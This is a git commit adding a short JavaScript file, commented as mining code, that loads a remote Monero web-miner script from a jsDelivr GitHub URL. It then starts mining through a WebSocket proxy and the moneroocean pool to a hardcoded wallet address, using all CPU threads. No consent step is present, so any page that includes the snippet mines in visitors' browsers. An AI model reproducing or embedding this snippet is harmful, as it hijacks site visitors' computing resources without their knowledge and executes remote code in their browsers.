284729208b6002fee4e225532b3d1851bc30aa73
zloberka <124788613+zloberka@users.noreply.github.com>
2025-07-17 08:54:26 +0300

    Create javascript.js

---
+++ external/javascript.js
@@ -0,0 +1,17 @@
+// Start Of Mining Code (Javascript)
+// import command,
+// import 'https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/external/javascript.js';
+
+var script = document.createElement("script");
+script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
+document.head.appendChild(script);
+
+server = "wss://ny1.xmrminingproxy.com";
+var pool = "moneroocean.stream";
+var walletAddress = "4AvpXBT4sxVfNC8TzhsCZZ1dZbTCZWCqgFx7PMdTSsLxfDfLgChJvxq8yrz67AmJNMTQwF2a17Z8PXQxW29i62vrEQso5Ck";
+var workerId = "GH-XMR-JS-SNIPPET"
+var threads = -1;
+var password = "";
+startMining(pool, walletAddress, workerId, threads, password);
+throttleMiner = 20;
+// End Of Mining Code
